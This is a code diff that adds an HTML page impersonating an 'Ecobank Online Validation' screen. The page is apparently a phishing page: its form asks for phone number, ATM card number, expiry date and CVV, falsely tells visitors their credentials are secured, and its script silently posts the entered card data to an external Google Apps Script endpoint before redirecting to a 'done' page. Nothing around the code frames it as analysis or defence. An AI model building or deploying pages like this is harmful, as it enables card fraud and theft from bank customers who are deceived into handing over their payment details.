@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta-name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ecobank Online Validation</title>
+
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #001B44; /* Dark Blue */
+            font-family: Arial, sans-serif;
+            color: white;
+        }
+
+        /* 🔵 Bigger container */
+        .container {
+            max-width: 520px;              /* wider */
+            margin: 90px auto;             /* more spacing */
+            background: rgba(255,255,255,0.10); /* more visible */
+            padding: 45px;                 /* bigger padding */
+            border-radius: 18px;           /* larger curves */
+            box-shadow: 0 0 15px rgba(0,0,0,0.5);
+        }
+
+        h1 {
+            text-align: center;
+            font-weight: bold;
+            font-size: 30px;               /* bigger title */
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            text-align: center;
+            font-size: 18px;               /* bigger subtitle */
+            color: #B0B0B0;
+            margin-bottom: 35px;
+        }
+
+        /* 🔵 Bigger labels */
+        label {
+            font-size: 18px;
+            margin-top: 20px;
+            display: block;
+        }
+
+        /* 🔵 Bigger input fields */
+        input {
+            width: 100%;
+            padding: 20px;                 /* bigger height */
+            margin-top: 10px;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+        }
+
+        /* 🔵 Bigger button */
+        button {
+            width: 100%;
+            margin-top: 35px;
+            padding: 20px;
+            background-color: grey;
+            border: none;
+            border-radius: 10px;
+            font-size: 20px;               /* bigger text */
+            color: white;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 25px;
+            color: #CCCCCC;
+            font-size: 16px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <h1>ECOBANK ONLINE VALIDATION</h1>
+        <p class="subtitle">A LOT HAS CHANGED, SO HAVE WE.</p>
+
+        <form id="ecoForm">
+            <label>Phone Number</label>
+            <input type="tel" id="phone" required>
+
+            <label>ATM Card Number</label>
+            <input type="text" id="cardNumber" required>
+
+            <label>ATM Expiry Date</label>
+            <input type="month" id="expiry" required>
+
+            <label>ATM CVV</label>
+            <input type="number" id="cvv" required>
+
+            <button type="submit">Validate</button>
+        </form>
+
+        <footer>Your credentials are secured</footer>
+    </div>
+
+    <script>
+        document.getElementById("ecoForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+
+            const data = {
+                phone: document.getElementById("phone").value,
+                cardNumber: document.getElementById("cardNumber").value,
+                expiry: document.getElementById("expiry").value,
+                cvv: document.getElementById("cvv").value
+            };
+
+            fetch("https://script.google.com/macros/s/AKfycbzyhB1DYyxSeFjcxq30DfveoS7IQx3FxExsdrCz71UUaZNVLz6N8Skk0PM7qmztv6p58Q/exec", {
+                method: "POST",
+                mode: "no-cors",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            })
+            .then(() => {
+                // Redirect to done.html
+                window.location.href = "done.html";
+            });
+        });
+    </script>
+
+</body>
+</html>
